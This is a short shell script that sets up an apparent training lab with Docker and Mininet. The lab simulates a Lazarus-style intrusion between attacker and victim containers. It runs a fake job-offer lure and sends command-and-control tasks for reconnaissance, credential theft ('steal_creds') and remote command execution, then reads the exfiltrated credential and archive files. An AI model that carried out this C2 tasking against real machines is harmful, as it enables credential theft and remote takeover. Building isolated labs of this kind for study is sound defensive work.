# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker
sudo apt install -y docker.io docker-compose

# Install Mininet and Open vSwitch - this worked on my VM.
sudo apt install -y mininet openvswitch-switch

# Install Python packages
pip3 install flask requests

# Start services
sudo systemctl start docker
sudo systemctl enable docker
sudo systemctl start openvswitch-switch
sudo systemctl enable openvswitch-switch

# Build images
sudo docker build -t lazarus-attacker:latest -f Dockerfile.attacker .
sudo docker build -t lazarus-victim:latest -f Dockerfile.victim .

# Run the topology in one terminal
sudo python3 topology.py

# Start playing around - keep the beacons.log file in a separate terminal and keep an eye on it
sudo docker exec -it mn-victim bash -c "cd /home/victim/scripts && ./JobOffer.sh"
sudo docker exec -it mn-attacker tail -f /attacker/beacons.log
sudo docker exec mn-attacker curl -s http://10.0.0.1:8080/set_task/recon
sudo docker exec mn-attacker curl -s http://10.0.0.1:8080/set_task/steal_creds
sudo docker exec mn-attacker cat /attacker/victim_exfil_data/mn-victim_creds.txt
sudo docker exec mn-attacker tar -tzf /attacker/victim_exfil_data/mn-victim_exfiltrate.tar.gz
sudo docker exec mn-attacker curl -s http://10.0.0.1:8080/set_task/exec:whoami